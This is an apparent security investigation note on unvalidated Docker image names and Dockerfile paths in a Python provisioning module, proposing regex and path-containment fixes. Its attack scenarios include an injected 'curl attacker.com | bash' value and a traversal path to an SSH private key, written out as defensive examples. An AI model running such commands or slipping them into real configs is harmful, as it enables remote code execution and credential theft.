# SEC-005 Investigation: Unvalidated container build arguments

**Issue:** SEC-005@94eb69
**Started:** 2024-12-27T00:15:00Z
**Status:** In Progress

---

## Problem Analysis

### Location 1: `_build_docker_image()` at line 360-369

```python
build_cmd = [
    "docker", "build",
    "-t", cfg.docker_image,
    "-f", str(cfg.dockerfile),
    str(cfg.dockerfile.parent),
]
subprocess.run(build_cmd, check=True)
```

**Vulnerabilities:**
1. **`cfg.docker_image` not validated** - Could contain:
   - Malformed image names
   - Shell metacharacters (though list format prevents shell injection)
   - Docker build options injected via image name

2. **`cfg.dockerfile` path not validated** - Could be:
   - Path traversal: `../../malicious-Dockerfile`
   - Outside project directory

### Location 2: `_build_docker_run_cmd()` at line 705

```python
cmd = [
    "docker", "run", "--rm",
    *env_args,
    *volume_args,
    cfg.docker_image,  # Line 705 - NOT VALIDATED
    "bash", "-lc", inner_script,
]
```

**Vulnerabilities:**
- Same `cfg.docker_image` without validation
- If attacker controls config, they could specify malicious image

---

## Attack Scenarios

### Scenario 1: Image name injection
```python
# Attacker sets:
cfg.docker_image = "evil-image; curl attacker.com | bash"

# With list format, this becomes a literal image name (not executed)
# But could still pull and run unintended images
```

### Scenario 2: Path traversal via dockerfile
```python
# Attacker sets:
cfg.dockerfile = Path("../../.ssh/private_key")

# Builds from arbitrary file on system
```

### Scenario 3: Docker build options via image name
```python
# Some Docker options might be injectable via image name format
cfg.docker_image = "--build-arg=SECRET=value malicious/image"
```

---

## Proposed Solution

### 1. Validate docker image name

Add strict regex validation for Docker image names:

```python
import re

# Docker image name regex (simplified)
DOCKER_IMAGE_PATTERN = re.compile(
    r'^[a-z0-9]+([._-][a-z0-9]+)*'  # namespace
    r'(/[a-z0-9]+([._-][a-z0-9]+)*)*'  # image name
    r'(:[a-z0-9]+([._-][a-z0-9]+)*)?$'  # optional tag
    # r'(?::[a-f0-9]+)?'  # optional digest
)

def validate_docker_image(image: str) -> None:
    if not DOCKER_IMAGE_PATTERN.match(image):
        raise ValueError(f"Invalid docker image name: {image}")
```

### 2. Validate dockerfile path

Ensure dockerfile is within project directory:

```python
def validate_dockerfile_path(dockerfile: Path, project_root: Path) -> None:
    dockerfile = dockerfile.resolve()
    project_root = project_root.resolve()

    try:
        dockerfile.relative_to(project_root)
    except ValueError:
        raise ValueError(f"Dockerfile must be within project: {dockerfile}")
```

### 3. Validate in config loading

Add validation when RunConfig is created/loaded.

---

## Affected Files
- `src/dot_work/container/provision/core.py` (lines 360-369, 705)
- `src/dot_work/container/provision/core.py` (add validation functions)

---

## Acceptance Criteria
- [ ] Docker image names validated with strict regex
- [ ] Dockerfile paths validated to be within project
- [ ] Tests verify invalid inputs are rejected
- [ ] All existing tests pass

---

## Next Steps
1. Add validation functions
2. Call validations in `_build_docker_image()` and `_build_docker_run_cmd()`
3. Add tests for validation
4. Run validation
